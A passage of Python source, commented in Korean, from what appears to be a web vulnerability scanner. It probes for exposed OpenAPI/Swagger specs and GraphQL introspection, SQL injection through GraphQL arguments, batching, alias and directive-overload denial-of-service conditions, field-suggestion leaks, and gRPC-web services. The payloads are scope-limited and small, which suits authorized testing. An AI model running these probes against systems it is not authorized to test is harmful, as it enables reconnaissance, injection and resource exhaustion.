                elif loc == "body":  # swagger 2.0 body 파라미터(스키마 상위 필드)
                    sch = (prm.get("schema") or {}).get("properties") or {}
                    for fn, fs in list(sch.items())[:12]:
                        query_params[str(fn)] = _sample_value(fs, str(fn))
            # OpenAPI 3.x requestBody (application/json 상위 필드)
            rb = op.get("requestBody")
            if isinstance(rb, dict):
                content = (rb.get("content") or {})
                js = content.get("application/json") or next(iter(content.values()), {}) if content else {}
                props = ((js or {}).get("schema") or {}).get("properties") or {}
                for fn, fs in list(props.items())[:12]:
                    query_params[str(fn)] = _sample_value(fs, str(fn))
            # path 파라미터 채우기({id} → 1)
            filled_path = path_str
            for pn, pv in path_fill.items():
                filled_path = filled_path.replace("{" + pn + "}", pv)
            # 남은 미치환 {..} 는 기본값으로
            filled_path = re.sub(r"\{[^}]+\}", "1", filled_path)
            url = base + filled_path
            if query_params and "?" not in url:
                url = url + "?" + urllib.parse.urlencode(query_params)
            sig = (m, url, tuple(sorted(query_params)))
            if sig in seen:
                continue
            seen.add(sig)
            points.append({"method": m, "url": url, "params": dict(query_params),
                           "source": "openapi_spec", "csrf_fields": []})
            if len(points) >= cap:
                return points
    return points


async def _fetch_spec_injection_points(session, base_url: str, cap: int = 120) -> list[dict]:
    """알려진 스펙 경로에서 OpenAPI/Swagger 문서를 가져와 주입점으로 변환(발견 시)."""
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    for path in _SWAGGER_PATHS:
        try:
            st, body, _ = await _get(session, origin + path)
        except ScanInterrupted:
            raise
        except Exception:
            continue
        if st == 200 and body and _SPEC_JSON_HINT.search(body[:5000]):
            pts = openapi_spec_to_injection_points(body, origin + path, cap=cap)
            if pts:
                return pts
    return []


async def _probe_swagger_openapi(session, base_url: str, scan_id: str = "") -> dict | None:
    """Swagger/OpenAPI 문서 노출: 인증 없이 API 스펙 전체 열람 가능 여부 확인."""
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    for path in _SWAGGER_PATHS:
        url = origin + path
        status, body, hdrs = await _get(session, url)
        if status not in (200, 201):
            continue
        ct = hdrs.get("Content-Type", "") or hdrs.get("content-type", "")
        if not body:
            continue
        if not _SWAGGER_CONTENT_RE.search(body[:4000]):
            continue

        # 본문이 실제 스펙(JSON/YAML)이면 그대로, swagger-ui HTML 이면 그 UI 가 가리키는
        # 실제 스펙 URL 을 추출해 따라간다(비표준 파일명 대응). 단 스펙 fetch 는 스코프 내만 허용.
        spec_url, spec_body = url, body
        if not _SPEC_JSON_HINT.search(body[:8000]):
            for cand in _extract_spec_urls(body, url):
                if not _url_in_scope(cand, base_url):
                    continue   # online.swagger.io 등 제3자 스펙 URL 은 가져오지 않음
                _s2, _b2, _ = await _get(session, cand)
                if _s2 in (200, 201) and _b2 and _SPEC_JSON_HINT.search(_b2[:8000]):
                    spec_url, spec_body = cand, _b2
                    break

        # OpenAPI JSON/YAML 심층 분석
        url = spec_url
        body = spec_body
        api_summary = _parse_openapi_spec(spec_body, spec_url)

        endpoint_hint = ""
        if api_summary["total_endpoints"] > 0:
            endpoint_hint = f", {api_summary['total_endpoints']}개 API 경로 노출"
            if api_summary["admin_endpoints"]:
                endpoint_hint += f", 관리 API {len(api_summary['admin_endpoints'])}개"
            if api_summary["auth_endpoints"]:
                endpoint_hint += f", 인증 API {len(api_summary['auth_endpoints'])}개"

        # 스크린샷
        shot = None
        if scan_id:
            shot = await _capture_devtools_network_shot(
                scan_id, "swagger_openapi", url,
                highlight_texts=["swagger", "openapi", "paths", "securityDefinitions"],
                vuln_title=f"Swagger/OpenAPI 문서 무인증 노출 — {path}",
            )

        return {
            "url": url,
            "path": path,
            "status_code": status,
            "content_type": ct,
            "confirmed": True,
            "evidence_screenshots": [shot] if shot else [],
            "endpoint_hint": endpoint_hint,
            "api_summary": api_summary,
            "spec_body": body[:200000],   # API 심층 점검(_probe_api_deep) 재사용용
            "origin": origin,
            "evidence": (
                f"Swagger/OpenAPI 문서 무인증 노출: GET {url} → HTTP {status}"
                f"{endpoint_hint}. 전체 API 스펙·인증 방식·엔드포인트 열람 가능."
            ),
        }
    return None


async def _api_injection_points(session, base_url: str, max_points: int = 25) -> list[dict]:
    """발견된 OpenAPI 스펙의 엔드포인트를 표준 '주입점'으로 변환(능동 API 점검용).
    스펙에만 있고 HTML 링크엔 없는 API 파라미터까지 SQLi/XSS 등 기존 프로브가 점검하게 한다.
    SAFE: **GET(쿼리 파라미터)만** 능동 주입 대상으로 시딩한다. 쓰기(POST/PUT/PATCH)는 상태변경
    위험이 있어 여기서 페이로드를 쏘지 않고 api_deep 안티패턴 후보로만 남긴다. in-scope 만."""
    import api_audit as _aa
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    spec_body = None
    for path in _SWAGGER_PATHS:
        url = origin + path
        status, body, _ = await _get(session, url)
        if status not in (200, 201) or not body or not _SWAGGER_CONTENT_RE.search(body[:4000]):
            continue
        if _SPEC_JSON_HINT.search(body[:8000]):
            spec_body = body
            break
        for cand in _extract_spec_urls(body, url):
            if not _url_in_scope(cand, base_url):
                continue
            _s2, _b2, _ = await _get(session, cand)
            if _s2 in (200, 201) and _b2 and _SPEC_JSON_HINT.search(_b2[:8000]):
                spec_body = _b2
                break
        if spec_body:
            break
    if not spec_body:
        return []
    try:
        spec = _json.loads(spec_body)
    except Exception:
        try:
            import yaml as _y
            spec = _y.safe_load(spec_body)
        except Exception:
            return []
    ops = _aa.parse_openapi_operations(spec, base_origin=origin)
    pts: list[dict] = []
    for op in ops:
        if op.get("method") != "GET":
            continue   # SAFE: 능동 주입은 비파괴 GET 만
        qp = op.get("query_params") or []
        if not qp:
            continue   # 쿼리 없는 GET 은 주입 대상 아님(과다노출은 api_deep 담당)
        u = _aa.fill_path_params(op.get("url", ""), op.get("path_params"))
        if not u or not _url_in_scope(u, base_url):
            continue
        pts.append({"method": "GET", "url": u,
                    "params": {q: "1" for q in qp},
                    "source": "api_spec", "csrf_fields": []})
        if len(pts) >= max_points:
            break
    return pts


async def _probe_api_deep(session, spec_body: str, origin: str, scan_id: str = "") -> dict | None:
    """OpenAPI 스펙 기반 API 인지형 심층 점검(SAFE).

    - 과다 정보 노출: GET 오퍼레이션(필수 쿼리 없음) 응답 JSON 에서 민감 필드명 탐지(읽기 전용).
    - Mass Assignment 후보: 쓰기 오퍼레이션 본문의 권한/상태 속성(role/is_admin 등) 식별(요청 미전송).
    - BOLA 후보: 객체 식별자 경로 파라미터 식별(교차검증은 A/B 계정 IDOR 검증이 담당).
    상태 변경/쓰기 실행 없음 — 계획/판정 + GET 읽기만.
    """
    import api_audit as _aa
    try:
        import json as _j
        spec = _j.loads(spec_body)
    except Exception:
        try:
            import yaml as _y
            spec = _y.safe_load(spec_body)
        except Exception:
            return None
    if not isinstance(spec, dict):
        return None

    ops = _aa.parse_openapi_operations(spec, base_origin=origin)
    if not ops:
        return None

    # 1) 과다 정보 노출(읽기 전용 GET 스캔, 최대 15개)
    exposure = []
    for op in _aa.resolvable_get_ops(ops, max_n=15):
        url = _aa.fill_path_params(op["url"], op.get("path_params"))
        if not _url_in_scope(url, origin):
            continue   # 스펙이 외부 servers/host 를 선언해도 대상 밖으로는 요청하지 않음
        try:
            st, body, hdrs = await _get(session, url)
        except Exception:
            continue
        ct = (hdrs.get("Content-Type", "") or hdrs.get("content-type", "")) if isinstance(hdrs, dict) else ""
        if st != 200 or not body or "json" not in ct.lower():
            continue
        try:
            import json as _j2
            data = _j2.loads(body)
        except Exception:
            continue
        fields = _aa.find_sensitive_fields(data)
        if fields:
            exposure.append({"url": url, "method": "GET", "sensitive_fields": fields[:12]})

    # 2) 비즈니스로직 안티패턴 라이브러리 — 스펙 오퍼레이션에서 후보 결정적 생성
    #    (BOLA/Mass + 가격조작/재사용/흐름우회). 각 후보는 SAFE 테스트 레시피 포함.
    biz = _aa.business_logic_candidates(ops, spec=spec)
    mass = _aa.mass_assignment_candidates(ops)
    bola = _aa.bola_candidates(ops)

    if not (exposure or biz):
        return None

    # 카테고리별 요약
    from collections import Counter
    _by_cat = Counter(c["category"] for c in biz)
    parts = []
    if exposure:
        parts.append(f"과다 정보 노출 {len(exposure)}건(민감 필드 응답 노출)")
    for _cat, _n in _by_cat.most_common():
        parts.append(f"{_cat} 후보 {_n}건")
    return {
        "confirmed": False,   # 참고/수동검토(표면·계획)
        "operations_parsed": len(ops),
        "excessive_data_exposure": exposure,
        "business_logic_candidates": biz[:40],   # 안티패턴 통합 후보(SAFE 테스트 레시피 포함)
        "mass_assignment_candidates": mass[:15],  # 하위호환(기존 소비자 유지)
        "bola_candidates": bola[:20],
        "evidence": "API 심층 점검(안티패턴 라이브러리): " + " · ".join(parts),
    }


# ── Phase 2: GraphQL Introspection ──────────────────────────────────────────

_GRAPHQL_PATHS = ["/graphql", "/graphiql", "/playground", "/api/graphql", "/query", "/api/v1/graphql"]

_GRAPHQL_CONFIRM_RE = re.compile(r'"__schema"', re.IGNORECASE)

_GRAPHQL_FULL_INTROSPECTION = """
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields(includeDeprecated: true) {
        name
        description
        args { name type { name kind ofType { name kind } } }
      }
    }
  }
}
"""

_GQL_ADMIN_RE = re.compile(r'(?:admin|delete|remove|update|create|modify|ban|block|role|permission|config|setting|system)', re.IGNORECASE)
_GQL_USER_RE = re.compile(r'(?:user|account|login|logout|register|password|profile|email)', re.IGNORECASE)
_GQL_PAYMENT_RE = re.compile(r'(?:payment|order|charge|billing|invoice|refund|transaction)', re.IGNORECASE)


def _analyze_graphql_schema(body: str) -> dict:
    """GraphQL introspection 응답에서 쿼리/뮤테이션 목록과 위험도를 분석합니다."""
    result = {
        "queries": [], "mutations": [], "subscriptions": [],
        "admin_mutations": [], "user_mutations": [],
        "total_types": 0,
    }
    try:
        import json as _j
        data = _j.loads(body)
        schema = data.get("data", {}).get("__schema", {})
    except Exception:
        # 기본 파싱 fallback
        result["queries"] = re.findall(r'"name"\s*:\s*"([^"_][^"]+)"', body[:5000])[:10]
        return result

    if not schema:
        return result

    types = schema.get("types", [])
    result["total_types"] = len([t for t in types if not t.get("name", "").startswith("__")])

    query_type_name = (schema.get("queryType") or {}).get("name", "Query")
    mutation_type_name = (schema.get("mutationType") or {}).get("name", "Mutation")
    subscription_type_name = (schema.get("subscriptionType") or {}).get("name", "Subscription")

    for type_def in types:
        name = type_def.get("name", "")
        fields = type_def.get("fields") or []
        field_names = [f.get("name", "") for f in fields if f.get("name")]

        if name == query_type_name:
            result["queries"] = field_names[:20]
        elif name == mutation_type_name:
            result["mutations"] = field_names[:20]
            for fn in field_names:
                if _GQL_ADMIN_RE.search(fn):
                    result["admin_mutations"].append(fn)
                elif _GQL_USER_RE.search(fn):
                    result["user_mutations"].append(fn)
        elif name == subscription_type_name:
            result["subscriptions"] = field_names[:10]

    return result


async def _probe_graphql_introspection(session, base_url: str, scan_id: str = "") -> dict | None:
    """GraphQL Introspection: 스키마 전체 노출 + 쿼리/뮤테이션 목록 분석."""
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    for path in _GRAPHQL_PATHS:
        url = origin + path

        # 전체 인트로스펙션 쿼리 시도
        status, body, hdrs = await _post(
            session, url,
            json={"query": _GRAPHQL_FULL_INTROSPECTION.strip()},
            headers={**_SCANNER_HEADERS, "Content-Type": "application/json"},
        )
        # 실패 시 단순 쿼리 fallback
        if status not in (200, 201) or not body or not _GRAPHQL_CONFIRM_RE.search(body):
            status, body, hdrs = await _post(
                session, url,
                json={"query": "{ __schema { types { name } } }"},
                headers={**_SCANNER_HEADERS, "Content-Type": "application/json"},
            )
        if status not in (200, 201) or not body:
            continue
        if not _GRAPHQL_CONFIRM_RE.search(body):
            continue

        # 스키마 분석
        schema_info = _analyze_graphql_schema(body)
        mutations = schema_info["mutations"]
        admin_mutations = schema_info["admin_mutations"]

        shot = None
        if scan_id:
            shot = await _capture_devtools_network_shot(
                scan_id, "graphql_introspection", url,
                highlight_texts=["__schema", "types", "mutations", "queryType"],
                vuln_title=f"GraphQL Introspection 활성화 — {path}",
            )

        evidence_parts = [
            f"GraphQL Introspection 활성화: POST {url} → HTTP {status}",
            f"전체 타입 {schema_info['total_types']}개 노출",
        ]
        if schema_info["queries"]:
            evidence_parts.append(f"Query 목록: {', '.join(schema_info['queries'][:5])}")
        if mutations:
            evidence_parts.append(f"Mutation 목록: {', '.join(mutations[:5])}")
        if admin_mutations:
            evidence_parts.append(f"⚠ 관리 Mutation: {', '.join(admin_mutations[:5])}")

        return {
            "url": url,
            "path": path,
            "confirmed": True,
            "schema_info": schema_info,
            "evidence_screenshots": [shot] if shot else [],
            "evidence": " / ".join(evidence_parts),
        }
    return None


# ── GraphQL 쿼리 인젝션(인자값 SQLi) ────────────────────────────────────────────
# introspection 프로브는 '스키마 노출'만 본다. 여기서는 실제 쿼리 인자에 SQL 페이로드를 넣어
# 리졸버가 사용자 입력을 안전하지 않게 SQL 에 삽입하는지 실증한다(GraphQL 은 대개 HTTP 200 +
# 바디의 errors[] 에 DB 에러를 실어보내므로 상태코드가 아닌 에러 시그니처/차등으로 판정).
_GQL_INJ_INTROSPECTION = """
{ __schema {
  queryType { name }
  types {
    name kind
    fields(includeDeprecated: true) {
      name
      type { kind name ofType { kind name ofType { kind name } } }
      args { name type { kind name ofType { kind name ofType { kind name } } } }
    }
  }
} }
""".strip()


def _gql_unwrap_type(t: dict) -> tuple[str, str, bool]:
    """GraphQL 타입 래퍼(NON_NULL/LIST)를 벗겨 (kind, name, required) 반환."""
    required = False
    cur = t or {}
    # 최상위가 NON_NULL 이면 required
    if cur.get("kind") == "NON_NULL":
        required = True
    for _ in range(6):
        if cur.get("kind") in ("NON_NULL", "LIST") and cur.get("ofType"):
            cur = cur["ofType"]
        else:
            break
    return cur.get("kind", ""), cur.get("name", ""), required


def _gql_injectable_fields(introspection_body: str, cap: int = 6) -> list[dict]:
    """introspection 응답에서 String/ID 인자를 받는 Query 필드를 추출.
    반환: [{field, arg, needs_selection(bool), string_args:[name]}]. 주입 불가(비문자 required 인자
    보유) 필드는 제외."""
    try:
        import json as _j
        data = _j.loads(introspection_body)
        schema = data.get("data", {}).get("__schema", {})
    except Exception:
        return []
    if not schema:
        return []
    qname = (schema.get("queryType") or {}).get("name", "Query")
    out: list[dict] = []
    for tdef in schema.get("types", []):
        if tdef.get("name") != qname:
            continue
        for f in (tdef.get("fields") or []):
            args = f.get("args") or []
            if not args:
                continue
            string_args, skip = [], False
            for a in args:
                akind, aname_t, areq = _gql_unwrap_type(a.get("type") or {})
                is_str = akind == "SCALAR" and aname_t in ("String", "ID")
                if is_str:
                    string_args.append(a.get("name"))
                elif areq:
                    # 채울 수 없는 필수 비문자 인자 → 이 필드는 주입 시도 스킵
                    skip = True
                    break
            if skip or not string_args:
                continue
            rkind, _rn, _rq = _gql_unwrap_type(f.get("type") or {})
            needs_selection = rkind not in ("SCALAR", "ENUM")
            for arg in string_args:
                out.append({"field": f.get("name"), "arg": arg,
                            "needs_selection": needs_selection, "string_args": string_args})
                if len(out) >= cap:
                    return out
    return out


def _gql_build_query(field: str, target_arg: str, payload: str,
                     string_args: list, needs_selection: bool) -> str:
    """대상 인자에 payload, 나머지 문자열 인자엔 무해값을 채운 최소 유효 쿼리 생성."""
    def esc(v):
        return v.replace("\\", "\\\\").replace('"', '\\"')
    parts = []
    for a in string_args:
        val = payload if a == target_arg else "eoseureum_probe"
        parts.append(f'{a}: "{esc(val)}"')
    sel = " { __typename }" if needs_selection else ""
    return f'query {{ {field}({", ".join(parts)}){sel} }}'


async def _gql_endpoints(session, base_url: str, points, discovered_urls) -> list[str]:
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    urls, seen = [], set()
    for p in _GRAPHQL_PATHS:
        u = origin + p
        if u not in seen:
            seen.add(u); urls.append(u)
    # 발견된 입력점/URL 중 graphql/gql 경로도 후보에 추가(마이닝으로 발견됨)
    for src in (points or []):
        u = (src or {}).get("url", "")
        if u and re.search(r'/(graphql|gql|query)\b', u, re.IGNORECASE) and u not in seen:
            seen.add(u); urls.append(u)
    for u in (discovered_urls or []):
        if isinstance(u, str) and re.search(r'/(graphql|gql|query)\b', u, re.IGNORECASE) and u not in seen:
            seen.add(u); urls.append(u)
    return urls


async def _probe_graphql_injection(session, base_url: str, points: list[dict] | None = None,
                                   discovered_urls: list | None = None,
                                   scan_id: str = "") -> dict | None:
    """GraphQL 쿼리 인자값 SQLi: introspection 으로 String/ID 인자 Query 필드를 찾아 홑/균형
    따옴표 차등·DB 에러 시그니처로 주입을 실증한다. (비파괴 — 오작동 유발 입력만)"""
    hdrs = {**_SCANNER_HEADERS, "Content-Type": "application/json"}
    for url in await _gql_endpoints(session, base_url, points, discovered_urls):
        if not _url_in_scope(url, base_url):
            continue
        # 1) GraphQL 엔드포인트 확인 + introspection 수집
        try:
            st, body, _ = await _post(session, url,
                                      json={"query": _GQL_INJ_INTROSPECTION}, headers=hdrs)
        except ScanInterrupted:
            raise
        except Exception:
            continue
        if st not in (200, 201) or not body or '"__schema"' not in body:
            continue
        fields = _gql_injectable_fields(body)
        if not fields:
            continue
        # 2) 각 (field,arg) 에 홑/균형 따옴표 주입 차등
        for fa in fields:
            q_bad = _gql_build_query(fa["field"], fa["arg"], "eoseureum'",
                                     fa["string_args"], fa["needs_selection"])
            q_bal = _gql_build_query(fa["field"], fa["arg"], "eoseureum''",
                                     fa["string_args"], fa["needs_selection"])
            try:
                _, b_bad, _ = await _post(session, url, json={"query": q_bad}, headers=hdrs)
                _, b_bal, _ = await _post(session, url, json={"query": q_bal}, headers=hdrs)
            except ScanInterrupted:
                raise
            except Exception:
                continue
            if not b_bad:
                continue
            m = _SQL_ERR.search(b_bad)
            # (a) 홑따옴표 응답에 DB 에러 시그니처(GraphQL errors[] 에 실려옴)
            if m and not (b_bal and _SQL_ERR.search(b_bal)):
                return {
                    "type": "graphql_sqli", "confirmed": True, "url": url,
                    "param": f'{fa["field"]}.{fa["arg"]}', "method": "POST", "cwe_hint": "CWE-89",
                    "evidence": (f"GraphQL 쿼리 인젝션: '{url}' 의 Query 필드 '{fa['field']}' 인자 "
                                 f"'{fa['arg']}' 에 홑따옴표 주입 시 DB 에러 노출 — {m.group(0)[:80]} "
                                 f"(균형따옴표에선 미발생)"),
                    "affected_endpoints": [url],
                }
    return None


# ── GraphQL 배칭/DoS(리소스 제한 부재) ──────────────────────────────────────────
# GraphQL 고유 DoS 벡터: (a) 쿼리 배칭(요청당 다중 쿼리) → 레이트리밋 우회·증폭,
# (b) 별칭 증폭(단일 쿼리 내 동일 필드 다중 별칭) → 복잡도 제한 부재. 실제 DoS 를 유발하지
# 않고, __typename 같은 '무비용' 쿼리를 소량(배치 3·별칭 15)만 보내 '보호 제한의 부재'를 실증한다.
def _is_graphql_response(body: str) -> bool:
    if not body:
        return False
    try:
        import json as _j
        d = _j.loads(body)
    except Exception:
        return False
    if isinstance(d, dict):
        return ("data" in d and isinstance(d.get("data"), (dict, type(None)))) or "errors" in d
    if isinstance(d, list):
        return bool(d) and all(isinstance(x, dict) and ("data" in x or "errors" in x) for x in d)
    return False


async def _probe_graphql_dos(session, base_url: str, points: list[dict] | None = None,
                             discovered_urls: list | None = None,
                             scan_id: str = "") -> dict | None:
    """GraphQL 배칭/별칭 증폭 허용(리소스 제한 부재) 실증. 비파괴 — 무비용 쿼리 소량만 전송."""
    import json as _j
    hdrs = {**_SCANNER_HEADERS, "Content-Type": "application/json"}
    for url in await _gql_endpoints(session, base_url, points, discovered_urls):
        if not _url_in_scope(url, base_url):
            continue
        # GraphQL 엔드포인트 확인(단일 무비용 쿼리)
        try:
            st, body, _ = await _post(session, url, json={"query": "{ __typename }"}, headers=hdrs)
        except ScanInterrupted:
            raise
        except Exception:
            continue
        if st not in (200, 201) or not _is_graphql_response(body):
            continue

        vectors = []
        # (a) 배칭: 동일 무비용 쿼리 3개 배열 → 배열 응답(len 3)이면 배치 허용
        try:
            _, bb, _ = await _post(session, url,
                                   json=[{"query": "{ __typename }"} for _ in range(3)], headers=hdrs)
        except ScanInterrupted:
            raise
        except Exception:
            bb = None
        try:
            batch_ok = bool(bb) and isinstance(_j.loads(bb), list) and len(_j.loads(bb)) == 3
        except Exception:
            batch_ok = False
        if batch_ok:
            vectors.append("배치 쿼리 허용 — 한 요청에 다중 쿼리(3개) 실행 확인. "
                           "레이트리밋 우회(예: 로그인 다중 시도)·요청 증폭 가능")

        # (b) 별칭 증폭: 단일 쿼리에 __typename 별칭 15개 → 전부 해석되면 복잡도 제한 부재
        aliases = " ".join(f"a{i}: __typename" for i in range(15))
        try:
            _, ba, _ = await _post(session, url, json={"query": "{ " + aliases + " }"}, headers=hdrs)
            data = (_j.loads(ba) or {}).get("data") or {}
            alias_ok = isinstance(data, dict) and sum(1 for i in range(15) if f"a{i}" in data) >= 15
        except ScanInterrupted:
            raise
        except Exception:
            alias_ok = False
        if alias_ok:
            vectors.append("별칭 증폭 허용 — 단일 쿼리 내 동일 필드 별칭 15개 전부 해석. "
                           "쿼리 복잡도/개수 제한 부재로 자원 소모 증폭 가능")

        if vectors:
            return {
                "type": "graphql_dos", "confirmed": True, "url": url,
                "param": "-", "method": "POST", "cwe_hint": "CWE-770",
                "evidence": (f"GraphQL 리소스 제한 부재: {url} — " + " / ".join(vectors) +
                             ". (비파괴 벤치마크 쿼리로 '제한 부재'만 확인)"),
                "affected_endpoints": [url],
            }
    return None


# ── GraphQL 필드 제안 누출(introspection off 여도 스키마 유출) ──────────────────────
# graphql-js 계열은 오타 필드 쿼리에 "Did you mean ..." 제안을 돌려줘 introspection 이 꺼져
# 있어도 유효 필드명을 유추 가능하게 한다(스키마 정보 노출). __typename 은 모든 타입의 보편
# 메타필드라, __typenam(오타)을 보내면 앱 스키마와 무관하게 제안이 트리거된다.
_GQL_SUGGEST_RE = re.compile(r'Did you mean\s+(.+?)\s*[?\n]', re.IGNORECASE)


def _gql_error_messages(body: str) -> str:
    """GraphQL 응답의 errors[].message 를 이스케이프 없는 원문으로 결합(정규식 매칭용)."""
    try:
        import json as _j
        d = _j.loads(body)
    except Exception:
        return body or ""
    errs = d.get("errors") if isinstance(d, dict) else None
    if not isinstance(errs, list):
        return body or ""
    return " \n".join(str(e.get("message", "")) for e in errs if isinstance(e, dict))


async def _probe_graphql_field_suggestion(session, base_url: str, points: list[dict] | None = None,
                                          discovered_urls: list | None = None,
                                          scan_id: str = "") -> dict | None:
    """GraphQL 필드 제안(Did you mean) 누출: introspection 비활성 시에도 스키마 유출 벡터."""
    hdrs = {**_SCANNER_HEADERS, "Content-Type": "application/json"}
    for url in await _gql_endpoints(session, base_url, points, discovered_urls):
        if not _url_in_scope(url, base_url):
            continue
        # GraphQL 엔드포인트 확인
        try:
            st, body, _ = await _post(session, url, json={"query": "{ __typename }"}, headers=hdrs)
        except ScanInterrupted:
            raise
        except Exception:
            continue
        if st not in (200, 201, 400) or not _is_graphql_response(body):
            continue
        # 오타 메타필드로 제안 유도(__typenam → __typename)
        try:
            _, eb, _ = await _post(session, url, json={"query": "{ __typenam }"}, headers=hdrs)
        except ScanInterrupted:
            raise
        except Exception:
            continue
        if not eb or not _is_graphql_response(eb):
            continue
        m = _GQL_SUGGEST_RE.search(_gql_error_messages(eb))
        if m:
            suggested = m.group(1)[:120]
            return {
                "type": "graphql_field_suggestion", "confirmed": True, "url": url,
                "param": "-", "method": "POST", "cwe_hint": "CWE-200",
                "evidence": (f"GraphQL 필드 제안 누출: {url} — 오타 필드 쿼리에 서버가 "
                             f"'Did you mean {suggested}' 제안 반환. introspection 이 꺼져 있어도 "
                             f"유효 필드명을 유추해 스키마를 재구성할 수 있음."),
                "affected_endpoints": [url],
            }
    return None


# ── GraphQL 지시자 오버로딩(directive overloading — 파서/검증 증폭 DoS) ──────────────
# GraphQL 파서는 필드에 붙는 지시자(@x)를 개수 제한 없이 파싱·검증한다. 동일 지시자를 대량으로
# 반복하면 서버가 전부 파싱·검증하며 자원을 소모한다(개수 제한 부재 = 증폭 DoS 표면).
# 비파괴: 실제 과부하가 아니라 '제한 부재'만 소형 페이로드(반복 200회, ~3KB)로 실증한다.
_GQL_LIMIT_RE = re.compile(r'too many|maximum|exceed|limit|complexit|depth|rate', re.IGNORECASE)


async def _probe_graphql_directive_overload(session, base_url: str, points: list[dict] | None = None,
                                            discovered_urls: list | None = None,
                                            scan_id: str = "") -> dict | None:
    """GraphQL 지시자 오버로딩: 동일 지시자 대량 반복을 서버가 개수 제한 없이 파싱·검증하는지 실증."""
    hdrs = {**_SCANNER_HEADERS, "Content-Type": "application/json"}
    _REPEAT = 200
    for url in await _gql_endpoints(session, base_url, points, discovered_urls):
        if not _url_in_scope(url, base_url):
            continue
        try:
            st, body, _ = await _post(session, url, json={"query": "{ __typename }"}, headers=hdrs)
        except ScanInterrupted:
            raise
        except Exception:
            continue
        if st not in (200, 201, 400) or not _is_graphql_response(body):
            continue
        # 동일 지시자 200회 반복(우리 식별자 @eoseureum). 서버가 전부 파싱하면 개수 제한 부재.
        overload = "query { __typename " + ("@eoseureum " * _REPEAT) + "}"
        try:
            sto, bo, _ = await _post(session, url, json={"query": overload}, headers=hdrs)
        except ScanInterrupted:
            raise
        except Exception:
            continue
        if not bo or not _is_graphql_response(bo):
            continue
        # 제한 시그니처(too many/limit/complexity 등)가 있으면 '제한 있음' → 미검출
        if _GQL_LIMIT_RE.search(_gql_error_messages(bo)):
            continue
        # 제한 없이 '정상 파싱(200/201)' 해야 제한 부재. 400 은 서버가 거부(제한 있음일 수 있음) → 제외.
        if sto in (200, 201):
            return {
                "type": "graphql_directive_overload", "confirmed": True, "url": url,
                "param": "-", "method": "POST", "cwe_hint": "CWE-770",
                "evidence": (f"GraphQL 지시자 오버로딩: {url} — 동일 지시자 {_REPEAT}회 반복 쿼리를 "
                             f"서버가 개수 제한 없이 파싱·검증(HTTP {sto}). 대량 지시자로 파서/검증 "
                             f"자원 소모를 증폭할 수 있음(제한 부재). (비파괴 소형 벤치마크)"),
                "affected_endpoints": [url],
            }
    return None


# ── gRPC-web 서비스 발견/확증 ──────────────────────────────────────────────────
# 모던 앱은 gRPC-web(gRPC over HTTP)로 백엔드와 통신한다. JS 에 grpc-web 클라이언트/서비스가
# 있으면 /package.Service/Method 형태의 추가 공격표면이 존재한다. 후보 경로를 grpc-web 요청으로
# 찔러 grpc-status 헤더/application/grpc-web content-type 으로 실제 gRPC-web 서비스를 확증한다.
_GRPC_WEB_SIGNAL_RE = re.compile(
    r'grpc[._-]?web|GrpcWebClientBase|grpc\.web|application/grpc-web|@improbable-eng/grpc-web',
    re.IGNORECASE)
_GRPC_PATH_RE = re.compile(r'["\'`](/[A-Za-z_][\w.]*\.[A-Za-z_]\w*/[A-Za-z_]\w*)["\'`]')


def _lc_headers(hdrs: dict) -> dict:
    return {str(k).lower(): str(v) for k, v in (hdrs or {}).items()}


async def _probe_grpc_web(session, base_url: str, discovered_urls: list | None = None,
                          scan_id: str = "") -> dict | None:
    """gRPC-web 서비스 발견: JS 의 grpc-web 신호 + /pkg.Service/Method 경로를 grpc-web 요청으로 확증."""
    html, jsblob = await _collect_page_js(session, base_url, discovered_urls)
    blob = (html or "") + "\n" + (jsblob or "")
    has_signal = bool(_GRPC_WEB_SIGNAL_RE.search(blob))
    cands = list(dict.fromkeys(m.group(1) for m in _GRPC_PATH_RE.finditer(blob)))[:8]
    if not has_signal and not cands:
        return None
    # 최소 gRPC-web 프레임(5바이트 헤더: 압축플래그0 + 길이0)로 후보를 찔러 응답 시그니처 확인.
    _frame = b"\x00\x00\x00\x00\x00"
    _hdrs = {"Content-Type": "application/grpc-web+proto", "X-Grpc-Web": "1",
             "Accept": "application/grpc-web+proto"}
    confirmed = None
    for path in cands:
        url = urllib.parse.urljoin(base_url, path)
        if not _url_in_scope(url, base_url):
            continue
        try:
            _st, _b, _h = await _post(session, url, data=_frame, headers=_hdrs)
        except ScanInterrupted:
            raise
        except Exception:
            continue
        lh = _lc_headers(_h)
        if "grpc-web" in (lh.get("content-type") or "") or "grpc-status" in lh:
            confirmed = url
            break
    if confirmed:
        return {
            "type": "grpc_web_service", "confirmed": True, "url": confirmed,
            "param": "-", "method": "POST", "cwe_hint": "CWE-200",
            "evidence": (f"gRPC-web 서비스 확증: '{confirmed}' 이 gRPC-web 요청에 grpc-status/"
                         f"application/grpc-web 로 응답 — 브라우저로는 안 보이는 gRPC 공격표면(추가 점검 대상)."),
            "affected_endpoints": [confirmed],
        }
    if has_signal and cands:
        _eps = [urllib.parse.urljoin(base_url, c) for c in cands[:5]]
        return {
            # 신호+경로후보만으로는 미확정(live grpc 응답이 없음) → POSSIBLE(수동 확인). 위 branch(grpc-status 응답)만 확정.
            "type": "grpc_web_service", "confirmed": False, "confidence": "POSSIBLE", "url": _eps[0],
            "param": "-", "method": "POST", "cwe_hint": "CWE-200",
            "evidence": (f"gRPC-web 클라이언트 사용 감지 + 서비스 경로 후보 {len(cands)}개 "
                         f"({', '.join(cands[:3])} 등) — gRPC-web 공격표면 가능(수동 확인 권장, 미확정)."),
            "affected_endpoints": _eps,
        }
    return None


# ── h2c(평문 HTTP/2) 업그레이드 감지 ─────────────────────────────────────────────
# 백엔드가 평문 HTTP/2(h2c) 업그레이드를 수락하면, 앞단 프록시가 h2c 를 검사하지 않을 경우
# 요청 스머글링/내부 접근(h2c smuggling)의 발판이 된다. 101 Switching Protocols(h2c)로 실증.
async def _probe_h2c(base_url: str, scan_id: str = "") -> dict | None:
    parsed = urllib.parse.urlparse(base_url)
